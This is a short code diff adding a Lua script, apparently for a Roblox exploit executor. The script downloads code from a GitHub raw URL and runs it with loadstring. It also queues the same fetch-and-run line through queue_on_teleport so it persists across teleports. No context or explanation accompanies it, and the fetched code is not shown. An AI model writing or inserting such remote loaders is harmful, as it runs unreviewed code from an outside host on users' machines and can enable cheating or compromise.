@@ -1,0 +1,6 @@
+local scriptCode = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/bossvegas2012-design/A/refs/heads/main/ton"))()'
+task.wait(10)
+if queue_on_teleport then
+    queue_on_teleport(scriptCode)
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bossvegas2012-design/A/refs/heads/main/ton"))()
